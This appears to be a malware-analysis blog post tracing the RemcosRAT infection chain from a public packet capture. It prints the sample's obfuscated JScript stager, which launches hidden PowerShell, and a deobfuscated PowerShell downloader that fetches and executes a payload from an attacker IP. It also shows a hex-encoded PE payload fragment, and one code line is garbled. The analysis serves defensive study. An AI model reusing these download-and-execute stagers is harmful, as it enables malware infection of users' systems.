I"[<p>RemcosRAT is a Fileless multi-stage malware that is distributed through malicious macros in Excel files. The malware enables remote administration of infected systems to perform unintended actions. This is a simple guide on understanding RemcosRat infection chain. The RemcosRAT infection chain can be described as shown by image <a href="https://twitter.com/Unit42_Intel/status/1478744612516900868">@Unit 42</a>.</p>

<p><img src="/assets/images/mal/remcosrat/chain.jpeg" alt="Infection Chain" /></p>

<p>The infection chain start through phishing of the targets through mail services and the final payload of the infection chain is the used for communicating through TCP port 10174 as shown in the image.</p>

<p>The samples and IOC can be downloaded from malware-traffic-analysis website <a href="https://www.malware-traffic-analysis.net/2022/01/04/index.html">RemcosRat sample</a>.</p>

<h2 id="pcap-analysis">Pcap Analysis</h2>

<p><a href="https://twitter.com/malware_traffic/status/1478755988023001089">Brad</a> has provided infection traffic pcap of the malware samples in his website.</p>

<p><img src="/assets/images/mal/remcosrat/http_filter.png" alt="Http filter" /></p>

<p>Image above shows a Filter of <strong>http</strong> traffic in wireshark used for downloading further executables into infected machine.The malware gets additional samples using <strong>GET</strong> method as highlighted.</p>

<p>From the tweet provided by <strong>unit42intel</strong>, the above link of the onedrive downloads a <code class="language-plaintext highlighter-rouge">VBS</code> file. The vbs file is not available in the onedrive at the time of writting but it is provided in malware-traffic-analysis website.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td> --><td class="rouge-code"><pre><span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>Object moved<span class="nt">&lt;/title&gt;</span>
  <span class="nt">&lt;/head&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;h2&gt;</span>
      Object moved to
      <span class="nt">&lt;a</span>
        <span class="na">href=</span><span class="s">"https://onedrive.live.com/download?cid=64F8294A00286885&amp;amp;resid=64F8294A00286885%21770&amp;amp;authkey=ABI3zrc6BsVUKxU"</span>
        <span class="nt">&gt;</span>here<span class="nt">&lt;/a</span>
      <span class="nt">&gt;</span>.
    <span class="nt">&lt;/h2&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Verify the sha256 hash of the <code class="language-plaintext highlighter-rouge">misc.vbs</code> matches the one provided in IOCs of Remcos Rat.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>@remcosrat<span class="nv">$ </span>shasum <span class="nt">-a</span> 256 misc.vbs
95c0a9e6463a2eb1bbfe3198cd4b6cd74927a209ca4ab17501c2f444494f4499  misc.vbs
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="stage2---downloader-atcnjpg">Stage2 - Downloader (atcn.jpg)</h2>

<p>Right click the <code class="language-plaintext highlighter-rouge">GET /atcn.jpg</code> url in wireshark and follow the <strong>http</strong> stream. The HTTP streams of the urls accessed by the malware as shown below.</p>

<p><img src="/assets/images/mal/remcosrat/stage1_stream.png" alt="url wireshark" /></p>

<p>Malware is executing a powershell script which is obsfuscated. For further analysis we can export all the http objects. To export http objects, click <code class="language-plaintext highlighter-rouge">File -&gt; Export Objects -&gt; HTTP</code> in wireshark. select saveall to download all the http objects in malware connection traffic.</p>

<p><img src="/assets/images/mal/remcosrat/exported_http.png" alt="Export Http objects " /></p>

<p>The downloaded files as are not images as the extensions suuggests to. They are ASCCII text files.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>file atcn.jpg
atcn.jpg: ASCII text, with very long lines <span class="o">(</span>4130<span class="o">)</span>, with CRLF line terminators
<span class="nv">$ </span>file calient.jpg
calient.jpg: ASCII text, with very long lines <span class="o">(</span>65536<span class="o">)</span>, with no line terminators
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Below is the obfuscated powershell script.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td> --><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">xsl</span><span class="p">:</span><span class="nx">stylesheet</span> <span class="nx">version</span><span class="o">=</span><span class="dl">"</span><span class="s2">1.0</span><span class="dl">"</span>
      <span class="nx">xmlns</span><span class="p">:</span><span class="nx">xsl</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://www.w3.org/1999/XSL/Transform</span><span class="dl">"</span>
      <span class="nx">xmlns</span><span class="p">:</span><span class="nx">msxsl</span><span class="o">=</span><span class="dl">"</span><span class="s2">urn:schemas-microsoft-com:xslt</span><span class="dl">"</span>
      <span class="nx">xmlns</span><span class="p">:</span><span class="nx">user</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://mycompany.com/mynamespace</span><span class="dl">"</span><span class="o">&gt;</span>

 <span class="o">&lt;</span><span class="nx">msxsl</span><span class="p">:</span><span class="nx">script</span> <span class="nx">language</span><span class="o">=</span><span class="dl">"</span><span class="s2">JScript</span><span class="dl">"</span> <span class="kr">implements</span><span class="o">-</span><span class="nx">prefix</span><span class="o">=</span><span class="dl">"</span><span class="s2">user</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;!</span><span class="p">[</span><span class="nx">CDATA</span><span class="p">[</span>


<span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="nx">x0asd44</span><span class="p">(</span><span class="dl">"</span><span class="s2">5368656c6c2e4170706c69636174696f6e</span><span class="dl">"</span><span class="p">))</span>

<span class="kd">var</span> <span class="nx">yy</span><span class="o">=</span><span class="nx">r</span><span class="p">.</span><span class="nx">ShellExecute</span><span class="p">(</span><span class="dl">"</span><span class="s2">powershell.exe</span><span class="dl">"</span><span class="p">,</span><span class="nx">x0asd44</span><span class="p">(</span><span class="dl">"</span><span class="sspan><span class="dl">"</span><span class="p">),</span><span class="dl">""</span><span class="p">,</span><span class="dl">""</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>

<span class="kd">function</span> <span class="nx">x0asd44</span><span class="p">(</span><span class="nx">hex</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">str</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">hex</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">)</span> <span class="nx">str</span> <span class="o">+=</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">hex</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="mi">16</span><span class="p">));</span>
    <span class="k">return</span> <span class="nx">str</span><span class="p">;</span>
<span class="p">}</span>

<span class="p">]]</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="sr">/msxsl:script</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/xsl:stylesheet</span><span class="err">&gt;
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>First decode the string we are passing to <strong>ActiveXObject</strong> function.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td> --><td class="rouge-code"><pre><span class="kd">function</span> <span class="nx">x0asd44</span><span class="p">(</span><span class="nx">hex</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">str</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">hex</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">)</span>
    <span class="nx">str</span> <span class="o">+=</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">hex</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="mi">16</span><span class="p">));</span>
  <span class="k">return</span> <span class="nx">str</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x0asd44</span><span class="p">(</span><span class="dl">"</span><span class="s2">5368656c6c2e4170706c69636174696f6e</span><span class="dl">"</span><span class="p">));</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Executing the above javascript code, our hexstring string parameter is decoded to <code class="language-plaintext highlighter-rouge">Shell.Application</code>.</p>

<p>Below is the deobfuscated powershell script which is passed <code class="language-plaintext highlighter-rouge">shell.Application</code> as shown in the obsfucated script.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td> --><td class="rouge-code"><pre><span class="s1">'[void] [System.Reflection.Assembly]::LoadWithPartialName(''Microsoft.VisualBasic'')'</span><span class="o">|</span><span class="n">IEX</span><span class="p">;</span><span class="w">
</span><span class="nv">$t56fg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Enum</span><span class="p">]::</span><span class="n">ToObject</span><span class="p">([</span><span class="n">System.Net.SecurityProtocolType</span><span class="p">],</span><span class="w"> </span><span class="mi">3072</span><span class="p">);</span><span class="w">
</span><span class="p">[</span><span class="n">System.Net.ServicePointManager</span><span class="p">]::</span><span class="n">SecurityProtocol</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$t56fg</span><span class="p">;</span><span class="w">
</span><span class="kr">do</span><span class="w"> </span><span class="p">{</span><span class="nv">$ping</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">test-connection</span><span class="w"> </span><span class="nt">-comp</span><span class="w"> </span><span class="nx">google.com</span><span class="w"> </span><span class="nt">-count</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nt">-Quiet</span><span class="p">}</span><span class="w"> </span><span class="kr">until</span><span class="w"> </span><span class="p">(</span><span class="nv">$ping</span><span class="p">);</span><span class="w">
</span><span class="nv">$tty</span><span class="o">=</span><span class="s1">'(New-Object Net.WebClient)'</span><span class="o">|</span><span class="n">I</span><span class="se">`E`X</span><span class="p">;</span><span class="w">
</span><span class="nv">$mv</span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Microsoft.VisualBasic.Interaction</span><span class="p">]::</span><span class="n">CallByname</span><span class="p">(</span><span class="nv">$tty</span><span class="p">,</span><span class="s1">'DownloadString'</span><span class="p">,[</span><span class="n">Microsoft.VisualBasic.CallType</span><span class="p">]::</span><span class="n">Method</span><span class="p">,</span><span class="s1">'http://104.223.119.167/calient.jpg'</span><span class="p">);</span><span class="w">
</span><span class="nv">$r78fd000sd</span><span class="o">=</span><span class="w"> </span><span class="nv">$mv</span><span class="w"> </span><span class="o">-split</span><span class="w"> </span><span class="s1">'%'</span><span class="w"> </span><span class="o">|</span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{[</span><span class="n">char</span><span class="p">][</span><span class="n">byte</span><span class="p">]</span><span class="s2">"0x</span><span class="bp">$_</span><span class="s2">"</span><span class="p">};</span><span class="w">
</span><span class="nv">$y5jh62df0</span><span class="o">=</span><span class="w"> </span><span class="n">I</span><span class="se">`E`X</span><span class="p">(</span><span class="nv">$r78fd000sd</span><span class="w"> </span><span class="o">-join</span><span class="w"> </span><span class="s1">''</span><span class="p">)</span><span class="w">
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>The deobfuscated powershell script above downloads another string at the domain highlighted above. The malware gets obsfuscated strings of the <code class="language-plaintext highlighter-rouge">calient.jpg</code> url.</p>

<h2 id="stage3---downloader-calientjpg">Stage3 - Downloader (calient.jpg)</h2>

<p>Stage two downloads third obfuscated script strings in calient.jpg url. String is obfuscated and is larger than second stage <code class="language-plaintext highlighter-rouge">atcn.jpg</code> string. Looking at the obfuscated strings we have an interesting string referenced by <code class="language-plaintext highlighter-rouge">ftIXfysfU</code> variable.</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td> --><td class="rouge-code"><pre>$y='[System.AppDomain]'|W0B4J;
$g55=$y.GetMethod("get_CurrentDomain")

 [String]$ftIXfysfU='4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300AF89D1610000000000000000E00002210B010800004402000048
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The string above seems to be an executable. This is because of the header file magic of PE executable. The magic number <code class="language-plaintext highlighter-rouge">4D5A</code> or ASCII characters MZ represents the beginning of the file signature of Microsoft PE file.</p>

<p><img src="/assets/images/mal/remcosrat/pehead.png" alt="Http filter" /></p>

<p>The python script belows decoded the bytes and returs an PE executable.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td> --><td class="rouge-code"><pre><span class="c1">#convert bytearray to PE
</span><span class="n">remcosPE</span><span class="o">=</span><span class="nb">bytearray</span><span class="p">(</span><span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s">'4D5A90000300000004000000FFFc....'</span><span class="p">))</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'open.exe'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">filepe</span><span class="p">:</span>
    <span class="n">filepe</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">remcosPE</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Now we have a fully RemcosRat malware, which is a .NET family malware.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>remcosrat<span class="nv">$ </span>file open.exe
open.exe: PE32 executable <span class="o">(</span>DLL<span class="o">)</span> <span class="o">(</span>console<span class="o">)</span> Intel 80386 Mono/.Net assembly, <span class="k">for </span>MS Windows
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Next step is analyzing dropped PE file.</p>

<h2 id="references">References</h2>

<ol>
  <li>https://www.malware-traffic-analysis.net/2022/01/04/index.html</li>
  <li>https://twitter.com/Unit42_Intel/status/1478744612516900868/</li>
</ol>
:ET